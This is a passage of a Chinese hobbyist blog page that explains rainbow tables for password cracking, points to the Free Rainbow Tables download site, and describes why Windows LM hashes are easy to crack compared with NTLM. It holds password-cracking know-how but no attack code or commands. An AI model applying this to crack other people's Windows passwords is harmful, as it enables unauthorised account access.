target="_blank" rel="external">点我下载</a><br><br><strong>3.Free Rainbow Tables（</strong><a href="http://www.freerainbowtables.com/" target="_blank" rel="external"><strong>http://www.freerainbowtables.com/</strong></a><strong>）</strong><br><br>比较新的 用的索引和压缩 所以速度更快 体积更小 而且支持分布式破解<br><br>支持HASH类型：LM，MD5，NTLM，SHA1，HALFLMCHALL<br><br>网上有已经生成好的表可供下载 真是造福于民<br><br>扩展名：rti<br><br>======================================================================<br><br><strong>继续科普：什么是LM和NTLM呢</strong><br><br>1.话说在远古时期 DES当道 我们的微软公司在考虑9X系统口令加密的时候就自然地采用了国家标准 DES一次加密8字节 微软公司留一位校检 还剩7字节（这句话有错，先说声抱歉，<a href="http://hi.baidu.com/hcocoa/blog/item/320554036ad617064afb511d.html" target="_blank" rel="external">这篇文章</a>有解释） 也就是LM（Lan Manage）的核心<br><br>2.那有的小朋友要问了 万一我的口令是8位怎么办呢 不用怕 微软公司的程序员很“聪明” ：先把前7位加密 后一位补6个0 再当7位一起加密不就可以了吗 结果就真的这么做了……<br><br>3.这就导致破解LM密码只需7位一分割 然后再逐块破解 这大大减少了破解的难度 因为最后一块往往不够七位 一般瞬间即可出结果 也就是 7位和13位的密码 在黑客眼里 几乎是一样的 因为13位的后6位很快就能破解出来 而且可以根据后6位猜测出前7位的密码 这就是为什么我们破XP和2003密码很快的原因 因为他们都使用了LM加密方式<br><br>4.由于LM的种种不安全性 微软在设计NT系列操作系统是时采用的新的口令存储手段 即NTLM技术（New Technology Lan Manage） 采用MD4+RSA存储 立马安全性要高很多 但是为了保证兼容性 直到2003 微软仍然保持着LM的加密方式 也就是在2K 2K3 和XP中 我们的口令同时保存了两份 一份LM 一份NTLM 我们仍然可以通过LM破解2003的口令<br><br>5.在Vista和2008中 微软终于下定决心对LM斩草除根 只留下NTLM 破解难度陡增<br><br>6.话题回到彩虹表 由于LM最多只有7位 所以它的彩虹表很小 而NTLM用了散列函数 所以理论上口令可以是无限长的 所以NTLM的<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">彩虹表</a>往往很大 120G肯定是不够完成所有可打印字符的 具体多大偶现在不明……<br><br>7.今天的科普到此结束，感谢你有耐心看到这里～<br><br>明天有机会继续科普<a href="http://hi.baidu.com/hcocoa/blog/item/c03eefda3f11176fd1164e88.html" target="_blank" rel="external">彩虹表</a>～<br><br></div><br></div>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">

            
    	<div class="footer-left">
    		&copy; 2016 双人份
    	</div>
    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    	本站总访问量<span id="busuanzi_value_site_pv"></span>次

      <div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: false,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>